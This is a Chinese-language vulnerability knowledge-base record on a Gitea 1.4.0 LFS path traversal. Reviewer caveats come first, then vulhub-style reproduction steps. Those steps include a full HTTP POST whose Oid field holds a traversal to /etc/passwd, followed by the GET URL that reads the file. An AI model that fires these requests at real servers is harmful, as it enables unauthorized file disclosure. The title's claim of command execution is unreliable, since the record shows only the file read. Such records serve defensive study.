---
source: "hatch 补库批 20260928"
product: "Gitea/LFS 路径遍历文件读取"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Gitea 1.4.0 目录穿越导致命令执行漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：只列1.4.0，无修复边界；公开仓库、LFS启用及重启设置不充分"
side_effects: "未执行；本文需注意的操作影响：实验和认证信息缺失；简介空白，启动后要重启但没说明原因；LFS请求含占位认证字段，无法确定最低权限，结果图片丢失"
source_status: "unknown"
id: "vw-05bc78d65e72fd7f7cfa183e"
entity_id: "ve-05bc78d65e72fd7f7cfa183e"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：只列1.4.0，无修复边界；公开仓库、LFS启用及重启设置不充分

代码与实验材料：POST对象元数据后GET遍历读取，只有读文件阶段；图片仅1.png/2.png文字

来源证据范围：称详见第二个参考链接但全文没有参考列表

- **证据待核（1）**：标题命令执行与已提供证据范围不一致；依据：正文承认只复现复杂RCE链的文件读取部分，缺所谓第二个参考链接。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **操作与副作用边界（2）**：实验和认证信息缺失；依据：简介空白，启动后要重启但没说明原因；LFS请求含占位认证字段，无法确定最低权限，结果图片丢失。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Gitea 1.4.0 目录穿越导致命令执行漏洞

一、漏洞简介
------------

二、漏洞影响
------------

Gitea 1.4.0

三、复现过程
------------

执行如下命令启动启动漏洞环境：

    docker-compose up -d

环境启动后，访问`http://www.0-sec.org:3000`，将进入安装页面，填写管理员账号密码，并修改网站URL，其他的用默认配置安装即可。（不要修改端口号）

安装完成后，创建一个公开的仓库，随便添加点文件进去（比如使用选定的文件和模板初始化仓库）：1.png

然后，需要执行一次docker-compose restart重启gitea服务。

由于漏洞链整体利用比较复杂，我们只复现文件读取部分，剩余利用方法详见第二个参考链接。

打开gitea，找到刚才创建的公开项目，如`vulhub/repo`，发送如下数据包，添加一个Git
LFS对象：

    POST /vulhub/repo.git/info/lfs/objects HTTP/1.1
    Host: www.0-sec.org:3000
    Accept-Encoding: gzip, deflate
    Accept: application/vnd.git-lfs+json
    Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    Connection: close
    Content-Type: application/json
    Content-Length: 151

    {
        "Oid": "....../../../etc/passwd",
        "Size": 1000000,
        "User" : "a",
        "Password" : "a",
        "Repo" : "a",
        "Authorization" : "a"
    }

然后，访问`http://www.0-sec.org:3000/vulhub/repo.git/info/lfs/objects/......%2F..%2F..%2Fetc%2Fpasswd/sth`，即可看到`/etc/passwd`已被成功读取：2.png
